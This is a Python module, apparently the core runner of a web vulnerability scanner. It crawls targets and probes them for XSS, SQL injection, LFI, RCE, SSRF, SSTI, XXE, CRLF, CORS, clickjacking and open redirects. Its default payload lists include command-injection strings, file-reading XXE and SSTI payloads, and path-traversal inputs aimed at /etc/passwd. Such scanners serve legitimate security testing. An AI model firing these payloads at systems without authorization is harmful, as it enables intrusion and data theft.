from scanners.scan_crlf import crlf    
from scanners.scan_lfi import lfi
from scanners.scan_xxe import xxe
from parametizer.core.save_it import save_output
from scanners.scan_redirect import redirect
from scanners.scan_ssrf import ssrf
from scanners.scan_ssti import ssti
from scanners.scan_clickjacking import clickjacking
from scanners.scan_cors import cors
from scanners.scan_xss import xss
from scanners.scan_sqli import sqli
from scanners.scan_rce import rce
from parametizer.params import parametizer
from parametizer.progress import fmt_line, spinner_lock
from parametizer.params_p import parametizer_params
from parametizer.params_f import parametizer_forms
import sys
import os
import re
import os
import time
from urllib.parse import urlparse
import threading

from colorama import ansi

# Import block handling system
try:
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from core.block_handler import BlockHandler, ResultSaver, create_safe_request_session
    from colorama import Style
    BLOCK_HANDLER_AVAILABLE = True
except ImportError:
    BLOCK_HANDLER_AVAILABLE = False
    sys.stdout.write('\033[1;33m[⚠️] Block handler not available - continuing without WAF protection\033[0m\n')
sys.stdout.flush()


def _stdout_scope_label(url: str, param_endpoints) -> str:
    """
    Etiqueta corta para mensajes de consola.
    Solo con -param/-p: neluxmatizer pasa la lista en param_endpoints → mostramos netloc (sin path),
    porque los totales son de toda la lista, no de la primera URL sola.
    Con -u o -l: param_endpoints es None → se muestra la URL completa de cada iteración (sin cambio).
    """
    if param_endpoints is not None:
        host = urlparse(url).netloc
        return host if host else url
    return url


def _heartbeat_idle(stop: threading.Event, label: str) -> None:
    """Spinner mientras una fase larga bloquea (p. ej. headless Playwright)."""
    frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    while not stop.is_set():
        with spinner_lock:
            c = frames[i % len(frames)]
            sys.stdout.write(
                f"\r{ansi.clear_line()}\r\033[1;36m{c}\033[0m  {label}"
            )
            sys.stdout.flush()
        i += 1
        if stop.wait(0.12):
            break
    with spinner_lock:
        sys.stdout.write("\r" + ansi.clear_line())
        sys.stdout.flush()


def generate_pocs_for_domain(domain_vulnerabilities, domain, oob_domain=None):
    """Genera PoCs para un dominio específico con nombres basados en el dominio"""
    
    try:
        from poc_generator import PoCGenerator
        poc_gen = PoCGenerator()
        sys.stdout.write(f"✅ PoC Generator inicializado para dominio: {domain}\n")
        sys.stdout.flush()
        
        # Counters per vulnerability type
        poc_count = 0
        
        # Generate ONE PoC per vulnerability type for this domain
        for vuln_type, vulns in domain_vulnerabilities.items():
            if vulns:
                try:
                    if vuln_type == 'CLICKJACKING':
                        sys.stdout.write(f"\n🔍 Generating PoC for Clickjacking: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_clickjacking_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'XSS':
                        sys.stdout.write(f"\n🔍 Generating PoC for XSS: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_xss_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'SQLI':
                        sys.stdout.write(f"\n🔍 Generating PoC for SQLi: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_sqli_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'LFI':
                        sys.stdout.write(f"\n🔍 Generating PoC for LFI: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_lfi_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'RCE':
                        sys.stdout.write(f"\n🔍 Generating PoC for RCE: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_rce_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'SSRF':
                        sys.stdout.write(f"\n🔍 Generating PoC for SSRF: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_ssrf_poc(vulns, domain=domain, oob_domain=oob_domain)
                        
                    elif vuln_type == 'SSTI':
                        sys.stdout.write(f"\n🔍 Generating PoC for SSTI: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_ssti_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'XXE':
                        sys.stdout.write(f"\n🔍 Generating PoC for XXE: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_xxe_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'CRLF':
                        sys.stdout.write(f"\n🔍 Generating PoC for CRLF: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_crlf_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'CORS':
                        sys.stdout.write(f"\n🔍 Generating PoC for CORS: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_cors_poc(vulns, domain=domain)
                        
                    elif vuln_type == 'REDIRECT':
                        sys.stdout.write(f"\n🔍 Generating PoC for Open Redirect: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_redirect_poc(vulns, domain=domain)
                    
                    # Procesar resultado
                    if result.get('html_filename'):
                        sys.stdout.write(f"✅ {vuln_type} PoC generado: {result['html_filename']}\n")
                        sys.stdout.flush()
                        poc_count += 1
                    else:
                        sys.stdout.write(f"❌ Error: {result.get('error', 'Unknown error')}\n")
                        sys.stdout.flush()
                        
                except Exception as e:
                    sys.stdout.write(f"❌ Error generating {vuln_type} PoC: {e}\n")
                    sys.stdout.flush()
        
        sys.stdout.write(f"\n✅ Generated {poc_count} PoC files for domain: {domain}\n")
        sys.stdout.flush()
        
    except Exception as e:
        sys.stdout.write(f"❌ Error in PoC generation for domain {domain}: {e}\n")
        sys.stdout.flush()


def generate_pocs_for_vulnerabilities(vulnerabilities_by_type, target_url, result_saver=None, oob_domain=None):
    """Genera PoCs para todas las vulnerabilidades encontradas - UN PoC por tipo de vulnerabilidad"""
    
    try:
        from poc_generator import PoCGenerator
        poc_gen = PoCGenerator()
        sys.stdout.write(f"✅ PoC Generator inicializado para {target_url}\n")
        sys.stdout.flush()
        
        # Counters per vulnerability type
        poc_count = 0
        generated_pocs = set()  # To avoid generating duplicate PoCs
        
        # Generate ONE PoC per vulnerability type
        for vuln_type, vulns in vulnerabilities_by_type.items():
            if vulns and vuln_type not in generated_pocs:
                generated_pocs.add(vuln_type)
                
                # Use all vulnerabilities of this type to generate the PoC
                try:
                    if vuln_type == 'CLICKJACKING':
                        sys.stdout.write(f"\n🔍 Generating PoC for Clickjacking: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_clickjacking_poc(vulns)
                        
                    elif vuln_type == 'XSS':
                        sys.stdout.write(f"\n🔍 Generating PoC for XSS: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_xss_poc(vulns)
                        
                    elif vuln_type == 'SQLI':
                        sys.stdout.write(f"\n🔍 Generating PoC for SQLi: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_sqli_poc(vulns)
                        
                    elif vuln_type == 'LFI':
                        sys.stdout.write(f"\n🔍 Generating PoC for LFI: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_lfi_poc(vulns)
                        
                    elif vuln_type == 'RCE':
                        sys.stdout.write(f"\n🔍 Generating PoC for RCE: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_rce_poc(vulns)
                        
                    elif vuln_type == 'SSRF':
                        sys.stdout.write(f"\n🔍 Generating PoC for SSRF: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_ssrf_poc(vulns, oob_domain=oob_domain)
                        
                    elif vuln_type == 'SSTI':
                        sys.stdout.write(f"\n🔍 Generating PoC for SSTI: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_ssti_poc(vulns)
                        
                    elif vuln_type == 'XXE':
                        sys.stdout.write(f"\n🔍 Generating PoC for XXE: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_xxe_poc(vulns)
                        
                    elif vuln_type == 'CRLF':
                        sys.stdout.write(f"\n🔍 Generating PoC for CRLF: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_crlf_poc(vulns)
                        
                    elif vuln_type == 'CORS':
                        sys.stdout.write(f"\n🔍 Generating PoC for CORS: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_cors_poc(vulns)
                        
                    elif vuln_type == 'REDIRECT':
                        sys.stdout.write(f"\n🔍 Generating PoC for Open Redirect: {len(vulns)} URLs\n")
                        sys.stdout.flush()
                        result = poc_gen.generate_redirect_poc(vulns)
                    
                    # Procesar resultado
                    if result.get('html_filename'):
                        sys.stdout.write(f"✅ {vuln_type} PoC generado: {result['html_filename']}\n")
                        sys.stdout.flush()
                        poc_count += 1
                        if result_saver:
                            result_saver.add_vulnerability(first_vuln, target_url)
                    else:
                        sys.stdout.write(f"❌ Error: {result.get('error', 'Unknown error')}\n")
                        sys.stdout.flush()
                        
                except Exception as e:
                    sys.stdout.write(f"❌ Error generating {vuln_type} PoC: {e}\n")
                    sys.stdout.flush()
        
        sys.stdout.write(f"\n✅ Generated {poc_count} PoC files\n")
        sys.stdout.flush()
        
    except Exception as e:
        sys.stdout.write(f"❌ Error in PoC generation: {e}\n")
        sys.stdout.flush()


def all_list(urls, c, cl, cr, x, xe, l, s, r, rc, sr, sst, fname, o,
             urls_vulnerables, threads, payloads, custom_headers, random_agent, oob_domain=None, poc=False, cookies=None, auth_token=None, checkpoint_manager=None, checkpoint_id=None, param_endpoints=None):

    # Counters for final report
    total_urls = len(urls)
    processed_urls = 0
    blocked_urls = 0  # Only incremented when actually blocked during attacks
    bypassed_urls = 0  # Only incremented when bypass is achieved during attacks
    safe_urls = 0      # Only incremented when there's no WAF or not blocked
    
    # 🔄 CHECKPOINT: Load already processed URLs if checkpoint exists
    processed_urls_from_checkpoint = []
    if checkpoint_manager and checkpoint_id:
        try:
            processed_urls_from_checkpoint = checkpoint_manager.get_processed_urls(checkpoint_id)
            if processed_urls_from_checkpoint:
                sys.stdout.write(f'\033[1;36m🔄 Active checkpoint: {len(processed_urls_from_checkpoint)} URLs already processed previously\033[0m\n')
                sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f'\033[1;33m[⚠️] Error loading checkpoint: {e}\033[0m\n')
            sys.stdout.flush()
    
    # Helper function to save checkpoint
    def save_checkpoint_for_url(url_to_save):
        """Save checkpoint for a URL that is being skipped or completed"""
        if checkpoint_manager and checkpoint_id:
            try:
                if url_to_save not in processed_urls_from_checkpoint:
                    processed_urls_from_checkpoint.append(url_to_save)
                checkpoint_data = {
                    'processed_urls': processed_urls_from_checkpoint,
                    'total_urls': total_urls,
                    'current_progress': processed_urls,
                    'scan_params': {
                        'cors': c,
                        'click': cl,
                        'crlf': cr,
                        'xss': x,
                        'xxe': xe,
                        'lfi': l,
                        'sql': s,
                        'redirect': r,
                        'rce': rc,
                        'ssrf': sr,
                        'ssti': sst,
                        'threads': threads
                    }
                }
                checkpoint_manager.save_checkpoint(checkpoint_id, checkpoint_data)
            except Exception as e:
                sys.stdout.write(f'\033[1;33m[⚠️] Error saving checkpoint: {e}\033[0m\n')
                sys.stdout.flush()
    
    # Dictionary to organize vulnerabilities by type
    vulnerabilities_by_type = {
        'XSS': [],
        'SQLI': [],
        'LFI': [],
        'RCE': [],
        'SSRF': [],
        'SSTI': [],
        'XXE': [],
        'CRLF': [],
        'CORS': [],
        'CLICKJACKING': [],
        'REDIRECT': []
    }
    
    # 🔒 BLOCK HANDLER SYSTEM
    block_handlers = {}  # One handler per URL
    result_savers = {}   # One saver per URL
    
    # Initialize handlers for each URL
    for url in urls:
        if BLOCK_HANDLER_AVAILABLE:
            block_handlers[url] = BlockHandler(url, custom_headers)
            if o:  # Only if output is enabled
                result_savers[url] = ResultSaver(fname, poc)
        else:
            block_handlers[url] = None
            result_savers[url] = None

    for u in urls:
        # 🔄 Check interruption before processing each URL
        try:
            from parametizer.interrupt import check_interruption
            if check_interruption():
                sys.stdout.write(f'\n\033[1;33m[⚠️] Scan interrupted by user\033[0m\n')
                sys.stdout.flush()
                
                # Save checkpoint before exiting
                if checkpoint_manager and checkpoint_id:
                    try:
                        checkpoint_data = {
                            'processed_urls': processed_urls_from_checkpoint,
                            'total_urls': total_urls,
                            'current_progress': processed_urls,
                            'interrupted': True,
                            'scan_params': {
                                'cors': c,
                                'click': cl,
                                'crlf': cr,
                                'xss': x,
                                'xxe': xe,
                                'lfi': l,
                                'sql': s,
                                'redirect': r,
                                'rce': rc,
                                'ssrf': sr,
                                'ssti': sst,
                                'threads': threads
                            }
                        }
                        checkpoint_manager.save_checkpoint(checkpoint_id, checkpoint_data)
                        sys.stdout.write(f'\033[1;32m💾 Progress saved: {len(processed_urls_from_checkpoint)} URLs processed before interruption\033[0m\n')
                        sys.stdout.write(f'\033[1;36mℹ️ To resume, run the same command again\033[0m\n')
                        sys.stdout.flush()
                    except Exception as e:
                        sys.stdout.write(f'\033[1;33m⚠️ Error saving checkpoint: {e}\033[0m\n')
                        sys.stdout.flush()
                
                sys.exit(0)
        except ImportError:
            pass  # If no interruption module, continue
        
        processed_urls += 1
        # scope_label: dominio solo si -param; con -u/-l siempre la URL completa (param_endpoints=None)
        scope_label = _stdout_scope_label(u, param_endpoints)
        sys.stdout.write(
            fmt_line("1;36", "[+] Scanning:", f"{scope_label} ({processed_urls}/{total_urls})")
            + "\n"
        )
        sys.stdout.flush()
        
        # 🔐 AUTHENTICATION MANAGEMENT
        auth_manager = None
        if cookies or auth_token:
            try:
                from parametizer.core.auth_manager import AuthManager
                auth_manager = AuthManager(cookies, auth_token)
                sys.stdout.write(f'\033[1;32m[+] Authentication enabled: {auth_manager.get_auth_info()}\033[0m\n')
                sys.stdout.flush()
            except ImportError:
                sys.stdout.write(f'\033[1;33m[!] Auth manager not available - continuing without authentication\033[0m\n')
                sys.stdout.flush()
        else:
            sys.stdout.write(f'\033[1;33m[!] No authentication provided - running unauthenticated scan\033[0m\n')
            sys.stdout.flush()
        
        # 🔒 WAF DETECTION (INFORMATIVE ONLY - DOES NOT BLOCK)
        try:
            # Import WAF detector
            sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            from core.waf_detector import WAFDetector
            
            #print(f'\033[1;33m[🔍] Checking WAF protection (informative only)...\033[0m')
            waf_detector = WAFDetector(u, custom_headers)
            
            # Detect WAF silently (informative only, does not block)
            waf_detector.detect_waf()
            # Only show when there's NO WAF or when it actually blocks
            if not waf_detector.waf_detected:
                sys.stdout.write(f'\033[1;32m[+] No WAF detected\033[0m\n')
                sys.stdout.flush()
            # If WAF is detected, don't print anything here
            # Report will only appear if it actually blocks us during attacks
                
        except ImportError:
            sys.stdout.write(f'\033[1;33m[⚠️] WAF detector not available - continuing without WAF protection\033[0m\n')
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f'\033[1;33m[⚠️] WAF detection error: {e} - continuing scan\033[0m\n')
            sys.stdout.flush()

        if param_endpoints:
            uri = list(dict.fromkeys(param_endpoints))
            urip = []
            for ep in uri:
                if "?" in ep.split("#", 1)[0]:
                    urip.append(ep)
            urip = list(dict.fromkeys(urip))
            urif = []
            sys.stdout.write(
                fmt_line("1;36", "[+] Total URLs from list:", str(len(uri))) + "\n"
            )
            sys.stdout.flush()
        else:
            uri = parametizer(u, None, threads)

            # Headless Chromium (Playwright): extra URLs after JS render — failures are non-fatal
            try:
                from parametizer.headless_crawl import run_headless_phase

                stop_hb = threading.Event()
                hb_thread = threading.Thread(
                    target=_heartbeat_idle,
                    args=(stop_hb, "Headless browser crawl…"),
                    daemon=True,
                )
                hb_thread.start()
                try:
                    hl_urls, hl_err = run_headless_phase(u, custom_headers, auth_manager)
                finally:
                    stop_hb.set()
                    hb_thread.join(timeout=5)

                if hl_err:
                    sys.stdout.write(f'\033[1;31m[!]\033[0m Headless crawl omitido: {hl_err}\n')
                    sys.stdout.flush()
                else:
                    with spinner_lock:
                        sys.stdout.write(
                            fmt_line("1;32", "[+] Headless:", f"{len(hl_urls)} URL(s)") + "\n"
                        )
                        sys.stdout.flush()
                    if hl_urls:
                        uri = list(dict.fromkeys(list(uri) + hl_urls))
            except Exception as _hl_ex:
                sys.stdout.write(
                    f'\033[1;31m[!]\033[0m Headless crawl omitido: {_hl_ex}\n'
                )
                sys.stdout.flush()

            # Un solo total tras parametizer + merge headless (parametizer ya no imprime este total)
            sys.stdout.write(
                fmt_line("1;36", "[+] Total URLs collected:", str(len(uri))) + "\n"
            )
            sys.stdout.flush()

            urip = parametizer_params(uri, output_file=None)
            urif = parametizer_forms(uri, output_file=None, threads=threads)
            urip_len_before_discovery = len(urip)

            # 🔍 ADVANCED PARAMETER DISCOVERY (Arjun-like)
            try:
                sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
                from parametizer.param_discovery import ParameterDiscovery

                sys.stdout.write(f'\033[1;33m[+] Starting advanced parameter discovery...\033[0m\n')
                sys.stdout.flush()

                # Use authenticated headers if available
                discovery_headers = custom_headers
                if auth_manager and auth_manager.is_authenticated():
                    discovery_headers = auth_manager.get_session_headers(custom_headers)
                    sys.stdout.write(f'\033[1;32m🔐 Using authenticated headers for parameter discovery\033[0m\n')
                    sys.stdout.flush()

                param_discovery = ParameterDiscovery(u, discovery_headers, max_threads=threads)

                # Discover parameters
                discovered_params = param_discovery.discover_parameters()

                if discovered_params:
                    # Generate URLs with discovered parameters
                    discovered_urls = param_discovery.get_discovered_urls()

                    # Add discovered URLs to existing lists
                    if urip:
                        urip.extend(discovered_urls)
                    else:
                        urip = discovered_urls

                    sys.stdout.write(
                        f'\r\033[K\033[1;32m[+] Advanced discovery found {len(discovered_params)} parameters\n'
                    )
                    sys.stdout.flush()
                else:
                    sys.stdout.write(f'\033[1;33m[!] No additional parameters discovered\033[0m\n')
                    sys.stdout.flush()

            except ImportError:
                sys.stdout.write(f'\033[1;33m[⚠️] Advanced parameter discovery not available - continuing with basic discovery\033[0m\n')
                sys.stdout.flush()
            except Exception as e:
                sys.stdout.write(f'\033[1;33m[⚠️] Advanced parameter discovery error: {e} - continuing with basic discovery\033[0m\n')
                sys.stdout.flush()

        has_param_surface = bool(urip or urif)
        raw_collected = list(dict.fromkeys(uri)) if uri else []
        # CORS / Clickjacking: responden por headers; usar todas las URLs recolectadas (no solo ?query=)
        urip_cl = raw_collected if raw_collected else (urip or [])
        urif_cl = urif or []

        # CRLF: igual que CORS — si no hay ?params ni forms, probar sobre URLs base recolectadas
        crlf_urip = list(urip) if urip else []
        crlf_urif = list(urif) if urif else []
        if not crlf_urip and not crlf_urif and raw_collected:
            crlf_urip = list(raw_collected)

        if not has_param_surface and not raw_collected:
            sys.stdout.write(f'\n\033[1;31m[-] No parameters found for {scope_label}\033[0m\n')
            sys.stdout.flush()

            if o:
                try:
                    with open(fname, 'a', encoding='utf-8') as f:
                        f.write(f"\n[SCAN RESULTS FOR: {u}]\n")
                        f.write(f"[TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
                        f.write(f"[INFO] No parameters found - skipping vulnerability scans\n")
                        f.write(f"\n{'='*80}\n")
                        f.write(f"SCAN COMPLETED FOR: {u}\n")
                        f.write(f"TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"{'='*80}\n\n")
                except Exception as e:
                    sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not write to output file: {e}\033[0m\n')
                    sys.stdout.flush()

            save_checkpoint_for_url(u)
            continue

        if not has_param_surface and raw_collected and not (cl or c):
            sys.stdout.write(f'\n\033[1;31m[-] No parameters found for {scope_label}\033[0m\n')
            sys.stdout.flush()

            if o:
                try:
                    with open(fname, 'a', encoding='utf-8') as f:
                        f.write(f"\n[SCAN RESULTS FOR: {u}]\n")
                        f.write(f"[TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
                        f.write(f"[INFO] No GET params/forms; enable -cors and/or -click to probe headers on collected URLs\n")
                        f.write(f"\n{'='*80}\n")
                        f.write(f"SCAN COMPLETED FOR: {u}\n")
                        f.write(f"TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"{'='*80}\n\n")
                except Exception as e:
                    sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not write to output file: {e}\033[0m\n')
                    sys.stdout.flush()

            save_checkpoint_for_url(u)
            continue

        if has_param_surface:
            sys.stdout.write(f'\033[1;36m[+] Found {len(urip)} URLs with parameters and {len(urif)} forms for {scope_label}\033[0m\n')
        sys.stdout.flush()
        print()
         
        if cl:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping Clickjacking scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            # Use authenticated headers for clickjacking
            scan_headers = custom_headers
            if auth_manager and auth_manager.is_authenticated():
                scan_headers = auth_manager.get_session_headers(custom_headers)
            clickjacking_vulns = clickjacking(urip_cl, urif_cl, [], threads, scan_headers, random_agent)
            vulnerabilities_by_type['CLICKJACKING'].extend(clickjacking_vulns)
            urls_vulnerables.extend(clickjacking_vulns)
        
        if c:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping CORS scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            # Use authenticated headers for CORS
            scan_headers = custom_headers
            if auth_manager and auth_manager.is_authenticated():
                scan_headers = auth_manager.get_session_headers(custom_headers)
            cors_vulns = cors(urip_cl, urif_cl, [], threads, scan_headers, random_agent)
            vulnerabilities_by_type['CORS'].extend(cors_vulns)
            urls_vulnerables.extend(cors_vulns)

        if xe and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping XXE scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/environ" >]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>'
            ]
            # Use authenticated headers for XXE
            scan_headers = custom_headers
            if auth_manager and auth_manager.is_authenticated():
                scan_headers = auth_manager.get_session_headers(custom_headers)
            xxe_vulns = xxe(urip, urif, wordlist, [], threads, scan_headers, random_agent)
            vulnerabilities_by_type['XXE'].extend(xxe_vulns)
            urls_vulnerables.extend(xxe_vulns)

        if x and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping XSS scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                '"><script>confirm(1)</script>',
                '<h1>NELUXMATIZER</h1>',
                '<img src=x onerror="alert(1)">'
            ]
            xss_vulns = xss(urip, urif, wordlist, [], threads, custom_headers, random_agent)
            vulnerabilities_by_type['XSS'].extend(xss_vulns)
            urls_vulnerables.extend(xss_vulns)

        if l and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping LFI scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                "../../../etc/passwd",
                "../../../../../../../../../../etc/passwd%00",
                "/proc/self/environ",
                "/etc/hosts",
                "/etc/issue",
                "/proc/version",
                "/proc/cmdline",
                ".htaccess",
                "Apache listing"
            ]
            lfi_vulns = lfi(urip, urif, wordlist, [], threads, custom_headers, random_agent)
            vulnerabilities_by_type['LFI'].extend(lfi_vulns)
            urls_vulnerables.extend(lfi_vulns)

        if s and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping SQLi scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                "%27",
                "' AND 1=1 -- ",
                "' AND 1=2 -- ",
                "' OR 1=1 -- ",
                "\" OR \"1\"=\"1\" -- "
            ]
            sqli_vulns = sqli(urip, urif, wordlist, [], threads, custom_headers, random_agent)
            vulnerabilities_by_type['SQLI'].extend(sqli_vulns)
            urls_vulnerables.extend(sqli_vulns)

        if rc and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping RCE scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                '| ifconfig',
                '& ifconfig',
                '&& ifconfig',
                'system("cat /etc/passwd");',
                '| echo Neluxmatizer',
                '; echo Neluxmatizer',
                '&& echo Neluxmatizer'
            ]
            rce_vulns = rce(urip, urif, wordlist, [], threads, custom_headers, random_agent)
            vulnerabilities_by_type['RCE'].extend(rce_vulns)
            urls_vulnerables.extend(rce_vulns)

        if sr and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping SSRF scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                r'file:///etc/passwd',
                r'file://\/\/etc/passwd',
                r'http://127.0.0.1'
            ]
            ssrf_vulns = ssrf(urip, urif, wordlist, [], threads, custom_headers, random_agent, oob_domain=oob_domain)
            vulnerabilities_by_type['SSRF'].extend(ssrf_vulns)
            urls_vulnerables.extend(ssrf_vulns)

        if r and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping Redirect scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                '////google.com/',
                'https:///google.com/',
                '/https:google.com',
                '<>javascript:alert(1);',
                'http:///////////google.com',
                'javascript:alert(1)'
            ]
            redirect_vulns = redirect(urip, urif, wordlist, [], threads, custom_headers, random_agent)
            vulnerabilities_by_type['REDIRECT'].extend(redirect_vulns)
            urls_vulnerables.extend(redirect_vulns)

        if sst and has_param_surface:
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping SSTI scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            wordlist = payloads if payloads else [
                "<%= File.open('/etc/passwd').read %>",
                "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"
            ]
            ssti_vulns = ssti(urip, urif, wordlist, [], threads, custom_headers, random_agent)
            vulnerabilities_by_type['SSTI'].extend(ssti_vulns)
            urls_vulnerables.extend(ssti_vulns)

        if cr and (crlf_urip or crlf_urif):
            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
                sys.stdout.write(f'\033[1;31m[🚨] Target {scope_label} is blocked - skipping CRLF scan\033[0m\n')
                sys.stdout.flush()
                if result_savers[u]:
                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
                continue
            
            crlf_vulns = crlf(crlf_urip, crlf_urif, [], threads, custom_headers, random_agent)
            vulnerabilities_by_type['CRLF'].extend(crlf_vulns)
            urls_vulnerables.extend(crlf_vulns)

        # Don't generate PoCs here - will be done at the end for all URLs
        
